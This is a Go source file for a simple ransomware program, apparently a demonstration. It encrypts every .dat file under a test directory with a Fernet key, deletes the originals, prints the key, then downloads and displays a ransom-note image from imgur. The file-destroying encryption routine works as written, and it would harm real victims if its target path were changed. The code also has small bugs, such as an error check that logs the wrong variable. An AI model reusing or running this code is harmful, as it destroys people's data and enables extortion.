package main

import (
	//Internals
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	//Externals
	"gitea.prentiss.name/robprentiss/fernet"
)

//This function attacks a file by encrypting it using a fernet key.
func attackFile(filename string, key *fernet.Key) {
	//@fn is the new name of the encrypted file.
	fn := filename + attackExtension

	//@rMsg contains the unprocessed data of the file name.
	rMsgUnprocessed, err := ioutil.ReadFile(filename)
	//@f contains the newly created file.
	f, err := os.Create(fn)
	if err != nil {
		log.Fatal(err)
	}

	//@eMsg contains the encrypted format of the data (--> String).
	eMsg, err := fernet.EncryptToString(rMsgUnprocessed, key)
	if err != nil {
		log.Fatal(err)
	}

	//@eMsgProcessed contains the encrypted format of the data (--> Bytes).
	eMsgProcessed := []byte(eMsg)

	//@fw writes the encrypted byte version format of the data, to the recently created file.
	fw := ioutil.WriteFile(fn, eMsgProcessed, 0644)
	if fw != nil {
		log.Fatal(err)
	}

	defer f.Close()

	//@rf contains the removed original file.
	rf := os.Remove(filename)
	if rf != nil {
		log.Fatalf("[!] os.Remove() returned with code %s", rf)
	}
}

//This function attacks all files in a particular path by encrypting them using a fernet key.
func attackAll(key *fernet.Key) error {

	//Traverse through a particular path of directories and look for file information.
	return filepath.Walk(attackPath, func(path string, info os.FileInfo, e error) error {
		if e != nil {
			return e
		}

		//Below controls operate if a file is a regular file (and not a directory) during traversal.
		if info.Mode().IsRegular() {
			//Below controls operate if the extension of a file equals our target files.
			if filepath.Ext(path) == attackTarget {
				//attackFile() encrypts the file using a fernet key.
				attackFile(path, key)
				//Optional logging which describes which file has been encrypted.
				fmt.Println("[+] This File Has Been Compromised:", path)
			}
		}
		return nil
	})
}

//@attackTarget contains the file extension format of the targeted files.
var attackTarget string = ".dat"

//@attackPath contains the particular path which contains the targeted files.
var attackPath string = "./TESTENV"

//@attackExtension contains the file extension format for the compromised files.
var attackExtension string = ".compromised"

// DownloadFile will download a url to a local file. It's efficient because it will
// write as it downloads and not load the whole file into memory.
func DownloadFile(filepath string, url string) error {

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}

func main() {
	//@key contains the generated fernet key which will be used for encryption/decryption.
	key, err := fernet.GenerateKey()
	if err != nil {
		log.Fatalf("[!] GenerateKey() returned with code %s", err)
	}
	fmt.Println("[+] This is The Key Required To Recover The Compromised Files:", key)
	fmt.Println("[.] File Attack Has Been Initiated ... Please Wait.")

	attackAll(key)

	fmt.Println("[+] File Attack Has Been Succesfully Completed.")

	// this should use the os temporary directory
	dir, err := ioutil.TempDir("", "")
	if err != nil {
		log.Fatalf("[!] ioutil.TempDir() returned with code %s", err)
	}
	changeDir := os.Chdir(dir)
	if changeDir != nil {
		log.Fatalf("[!] os.Chdir returned with code %s", changeDir)
	}

	fileUrl := "https://i.imgur.com/90OgME3.png"

	photo := DownloadFile(dir+"hackerNote.png", fileUrl)
	if photo != nil {
		log.Fatalf("[!] DownloadFile() returned with code %s", photo)
	}

	openPhoto := exec.Command("open", "-a", "/Applications/Preview.app", dir+"hackerNote.png")

	runPhoto := openPhoto.Run()
	if runPhoto != nil {
		log.Fatalf("[!] openPhoto.Run() returned with code %s", runPhoto)
	}

	time.Sleep(360 * time.Second)

	removePhoto := os.Remove(dir + "hackerNote.png")
	if removePhoto != nil {
		log.Fatalf("[!] os.Remove() returned with code %s", removePhoto)
	}
}

